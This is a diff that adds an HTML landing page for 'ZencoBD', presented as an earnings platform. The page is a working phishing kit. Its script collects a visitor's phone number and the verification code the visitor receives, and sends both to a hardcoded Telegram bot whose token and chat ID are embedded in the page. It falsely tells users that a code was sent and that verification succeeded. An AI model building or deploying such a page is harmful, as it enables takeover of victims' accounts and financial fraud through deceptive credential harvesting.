@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zenco – Power Your Earnings ⚡️💰</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #4361ee;
+            --secondary-color: #3a0ca3;
+            --accent-color: #f72585;
+            --dark-color: #14213d;
+            --light-color: #f8f9fa;
+            --gradient: linear-gradient(135deg, #4361ee 0%, #3a0ca3 100%);
+        }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f5f7ff;
+            color: var(--dark-color);
+            min-height: 100vh;
+        }
+        
+        .navbar {
+            background: white;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.08);
+        }
+        
+        .navbar-brand {
+            font-weight: 700;
+            font-size: 1.8rem;
+            color: var(--dark-color);
+            display: flex;
+            align-items: center;
+        }
+        
+        .hero-section {
+            background: var(--gradient);
+            color: white;
+            padding: 5rem 0;
+            border-radius: 0 0 20px 20px;
+            margin-bottom: 3rem;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hero-section::before {
+            content: "";
+            position: absolute;
+            top: -50px;
+            right: -50px;
+            width: 200px;
+            height: 200px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+        
+        .hero-section::after {
+            content: "";
+            position: absolute;
+            bottom: -80px;
+            left: -80px;
+            width: 300px;
+            height: 300px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+        
+        .hero-title {
+            font-weight: 700;
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+        
+        .hero-subtitle {
+            font-weight: 300;
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+        
+        .card {
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            border: none;
+            overflow: hidden;
+            transition: transform 0.3s, box-shadow 0.3s;
+            background: white;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.12);
+        }
+        
+        .card-header {
+            background: var(--gradient);
+            color: white;
+            font-weight: 600;
+            padding: 1.5rem;
+            font-size: 1.2rem;
+        }
+        
+        .btn-primary {
+            background: var(--gradient);
+            border: none;
+            padding: 12px 25px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            transition: all 0.3s;
+        }
+        
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #3a0ca3 0%, #4361ee 100%);
+            transform: translateY(-2px);
+        }
+        
+        .btn-send {
+            background: var(--accent-color);
+            color: white;
+            border: none;
+            transition: all 0.3s;
+        }
+        
+        .btn-send:hover {
+            background: #d91a6e;
+            transform: translateY(-2px);
+        }
+        
+        .form-control {
+            padding: 12px 15px;
+            border-radius: 8px;
+            border: 1px solid #e0e0e0;
+        }
+        
+        .form-control:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 0.25rem rgba(67, 97, 238, 0.25);
+        }
+        
+        .transaction-id {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--dark-color);
+            background-color: var(--light-color);
+            padding: 12px;
+            border-radius: 8px;
+            word-break: break-all;
+            border-left: 4px solid var(--accent-color);
+        }
+        
+        .help-line {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            z-index: 1000;
+        }
+        
+        .help-btn {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: var(--accent-color);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 10px 20px rgba(247, 37, 133, 0.3);
+            transition: all 0.3s;
+            animation: pulse 2s infinite;
+        }
+        
+        .help-btn:hover {
+            transform: scale(1.1) rotate(10deg);
+            color: white;
+            box-shadow: 0 15px 25px rgba(247, 37, 133, 0.4);
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(247, 37, 133, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(247, 37, 133, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(247, 37, 133, 0); }
+        }
+        
+        .logo {
+            height: 40px;
+            margin-right: 12px;
+        }
+        
+        .feature-icon {
+            font-size: 2.5rem;
+            color: var(--primary-color);
+            margin-bottom: 1rem;
+        }
+        
+        .feature-card {
+            padding: 2rem;
+            text-align: center;
+            border-radius: 15px;
+            height: 100%;
+        }
+        
+        .footer {
+            background: var(--dark-color);
+            color: white;
+            padding: 3rem 0;
+            margin-top: 5rem;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-light sticky-top">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <img src="https://d3o8hbmq1ueggw.cloudfront.net/6f2jb%2Fpreview%2F69402183%2Fmain_large.png?response-content-disposition=inline%3Bfilename%3D%22main_large.png%22%3B&response-content-type=image%2Fpng&Expires=1753669678&Signature=NnP8PykVWd6E~YXjGdKYSbT-ygITf0DzEHGTC4~GxPNqu~2RfUuBbAxMZcHzYrIK1~fVcRdebGD83qWtYBefSTotND3v2nm4Ttw9itcN8Tqh0dvYvkVSamEHedYsM83-HneUvbKdt1CDlQK9Ydp4TYYkxgGCVNXF0fg6uc-1bLrXkJE06edr7oos6gWCu9jU56P23tE6siMMet8RUT80VVLeFURj7yszXJLQx37ykawpTE1k7~tJj0r5-~APbRO4BpF0RJ9kOaW8EpHK0oaDp3l~u5hL8hPsmo53hCtqPPOxssT0lqlWKqcq01QOlOeo24H-9Uh9j5SniKUCHhOV8A__&Key-Pair-Id=APKAJT5WQLLEOADKLHBQ" alt="ZencoBD Logo" class="logo">
+                ZencoBD
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="#">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#">How It Works</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#">Benefits</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://t.me/ZencoBD">Contact</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero-section">
+        <div class="container text-center position-relative">
+            <h1 class="hero-title">Power Your Earnings ⚡️💰</h1>
+            <p class="hero-subtitle">Join thousands of users earning with ZencoBD's secure platform</p>
+        </div>
+  </section>
+
+      <!-- Main Content -->
+    <div class="container my-5">
+        <div class="row justify-content-center">
+            <div class="col-lg-8">
+                <div class="card">
+                    <div class="card-header text-center">
+                        <i class="fas fa-bolt me-2"></i> Start Earning Now
+                    </div>
+                    <div class="card-body p-4">
+                        <form id="paymentForm">
+                            <div class="mb-4">
+                                <label for="phoneNumber" class="form-label">Your Phone Number</label>
+                                <div class="input-group">
+                                    <span class="input-group-text"><i class="fas fa-mobile-alt"></i></span>
+                                    <input type="tel" class="form-control" id="phoneNumber" placeholder="Enter your phone number" required>
+                                    <button class="btn btn-send" type="button" id="sendCodeBtn">
+                                        <i class="fas fa-paper-plane me-1"></i> Send Code
+                                    </button>
+                                </div>
+                                <small class="text-muted">We'll send a verification code to this number</small>
+                            </div>
+                            
+                            <div class="mb-4">
+                                <label for="verificationCode" class="form-label">Verification Code</label>
+                                <div class="input-group">
+                                    <span class="input-group-text"><i class="fas fa-shield-alt"></i></span>
+                                    <input type="text" class="form-control" id="verificationCode" placeholder="Enter verification code" required disabled>
+                                </div>
+                            </div>
+                            
+                            <div class="d-grid gap-2 mt-4">
+                                <button class="btn btn-primary py-3" type="submit" id="submitBtn" disabled>
+                                    <i class="fas fa-rocket me-2"></i> Start Earning
+                                </button>
+                            </div>
+                        </form>
+                        
+                        <div id="transactionResult" class="mt-4 d-none">
+                            <div class="text-center mb-4">
+                                <i class="fas fa-check-circle fa-4x text-success mb-3"></i>
+                                <h3>Verification Successful!</h3>
+                                <p class="text-muted">You're now ready to start earning with ZencoBD</p>
+                            </div>
+                            
+                            <div class="alert alert-light border">
+                                <h5 class="mb-3"><i class="fas fa-receipt me-2"></i> Your Transaction ID:</h5>
+                                <div class="transaction-id mb-3" id="generatedTransactionId"></div>
+                                <div class="alert alert-info mt-3">
+                                    <i class="fas fa-info-circle me-2"></i>
+                                    For payment assistance, please contact our helpline and provide this transaction ID.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Features Section -->
+        <div class="row mt-5">
+            <div class="col-md-4 mb-4">
+                <div class="card feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <h4>Secure Platform</h4>
+                    <p class="text-muted">Your transactions and data are protected with advanced security measures.</p>
+                </div>
+            </div>
+            <div class="col-md-4 mb-4">
+                <div class="card feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <h4>Fast Payments</h4>
+                    <p class="text-muted">Get your earnings quickly with our streamlined payment process.</p>
+                </div>
+            </div>
+            <div class="col-md-4 mb-4">
+                <div class="card feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-headset"></i>
+                    </div>
+                    <h4>24/7 Support</h4>
+                    <p class="text-muted">Our team is always ready to assist you with any questions.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container text-center">
+            <img src="https://d3o8hbmq1ueggw.cloudfront.net/6f2jb%2Fpreview%2F69402183%2Fmain_large.png?response-content-disposition=inline%3Bfilename%3D%22main_large.png%22%3B&response-content-type=image%2Fpng&Expires=1753669678&Signature=NnP8PykVWd6E~YXjGdKYSbT-ygITf0DzEHGTC4~GxPNqu~2RfUuBbAxMZcHzYrIK1~fVcRdebGD83qWtYBefSTotND3v2nm4Ttw9itcN8Tqh0dvYvkVSamEHedYsM83-HneUvbKdt1CDlQK9Ydp4TYYkxgGCVNXF0fg6uc-1bLrXkJE06edr7oos6gWCu9jU56P23tE6siMMet8RUT80VVLeFURj7yszXJLQx37ykawpTE1k7~tJj0r5-~APbRO4BpF0RJ9kOaW8EpHK0oaDp3l~u5hL8hPsmo53hCtqPPOxssT0lqlWKqcq01QOlOeo24H-9Uh9j5SniKUCHhOV8A__&Key-Pair-Id=APKAJT5WQLLEOADKLHBQ" alt="ZencoBD Logo" class="logo mb-3">
+            <h3 class="mb-3">ZencoBD</h3>
+            <p class="mb-4">Powering your financial growth with secure and reliable solutions</p>
+            <p class="text-muted">© 2023 ZencoBD. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <!-- Help Line Button -->
+    <div class="help-line">
+        <a href="https://t.me/ZencoBD" class="help-btn" target="_blank" title="Contact Help Line">
+            <i class="fas fa-headset"></i>
+        </a>
+    </div>
+
+    <!-- Bootstrap JS Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneNumberInput = document.getElementById('phoneNumber');
+            const verificationCodeInput = document.getElementById('verificationCode');
+            const sendCodeBtn = document.getElementById('sendCodeBtn');
+            const submitBtn = document.getElementById('submitBtn');
+            const paymentForm = document.getElementById('paymentForm');
+            const transactionResult = document.getElementById('transactionResult');
+            const generatedTransactionId = document.getElementById('generatedTransactionId');
+            
+            // Telegram Bot Details
+            const BOT_TOKEN = '7928823563:AAFPLLsioGbaQ8L3Nj4IZHbDKJqsSmxQtFA';
+            const CHAT_ID = '2104472242';
+            
+            // Enable verification code field when send code is clicked
+            sendCodeBtn.addEventListener('click', async function() {
+                const phoneNumber = phoneNumberInput.value.trim();
+                
+                if (phoneNumber === '') {
+                    showAlert('Please enter your phone number first', 'warning');
+                    return;
+                }
+                
+                if (!isValidPhoneNumber(phoneNumber)) {
+                    showAlert('Please enter a valid phone number', 'warning');
+                    return;
+                }
+                
+                try {
+                    // Send to Telegram bot
+                    await sendToTelegram(`New verification request:\nPhone: ${phoneNumber}`);
+                    
+                    // Enable verification code field
+                    verificationCodeInput.disabled = false;
+                    
+                    showAlert('Verification code has been sent to your phone number', 'success');
+                } catch (error) {
+                    console.error('Error sending to Telegram:', error);
+                    showAlert('Failed to send verification code. Please try again.', 'danger');
+                }
+            });
+            
+            // Enable submit button when all fields are filled
+            [phoneNumberInput, verificationCodeInput].forEach(input => {
+                input.addEventListener('input', checkForm);
+            });
+            
+            function checkForm() {
+                const allFilled = [phoneNumberInput, verificationCodeInput].every(
+                    input => input.value.trim() !== '' && !input.disabled
+                );
+                submitBtn.disabled = !allFilled;
+            }
+            
+            // Generate unique transaction ID
+            function generateTransactionId() {
+                const timestamp = Date.now().toString(36);
+                const randomPart = Math.random().toString(36).substr(2, 9);
+                return `ZEN-${timestamp}-${randomPart}`.toUpperCase();
+            }
+            
+            // Form submission
+            paymentForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                try {
+                    // Generate unique transaction ID
+                    const transactionId = generateTransactionId();
+                    generatedTransactionId.textContent = transactionId;
+                    
+                    // Send complete data to Telegram
+                    await sendToTelegram(
+                        `New submission:\n` +
+                        `Phone: ${phoneNumberInput.value}\n` +
+                        `Verification Code: ${verificationCodeInput.value}\n` +
+                        `Transaction ID: ${transactionId}`
+                    );
+                    
+                    // Show transaction result
+                    transactionResult.classList.remove('d-none');
+                    
+                    // Reset form
+                    paymentForm.reset();
+                    verificationCodeInput.disabled = true;
+                    submitBtn.disabled = true;
+                    
+                    // Scroll to result
+                    transactionResult.scrollIntoView({ behavior: 'smooth' });
+                } catch (error) {
+                    console.error('Error:', error);
+                    showAlert('An error occurred. Please try again.', 'danger');
+                }
+            });
+            
+            // Helper function to send data to Telegram
+            async function sendToTelegram(message) {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                if (!response.ok) {
+                    throw new Error('Telegram API error');
+                }
+            }
+            
+            // Helper function to validate phone number
+            function isValidPhoneNumber(phone) {
+                // Simple validation - adjust as needed
+                const regex = /^[0-9]{10,15}$/;
+                return regex.test(phone);
+            }
+            
+            // Helper function to show alerts
+            function showAlert(message, type) {
+                const alertDiv = document.createElement('div');
+                alertDiv.className = `alert alert-${type} alert-dismissible fade show position-fixed`;
+                alertDiv.style.top = '20px';
+                alertDiv.style.right = '20px';
+                alertDiv.style.zIndex = '1100';
+                alertDiv.style.maxWidth = '400px';
+                alertDiv.role = 'alert';
+                alertDiv.innerHTML = `
+                    ${message}
+                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+                `;
+                
+                document.body.appendChild(alertDiv);
+                
+                // Auto remove after 5 seconds
+                setTimeout(() => {
+                    alertDiv.classList.remove('show');
+                    setTimeout(() => alertDiv.remove(), 150);
+                }, 5000);
+            }
+        });
+    </script>
+</body>
+  </html>
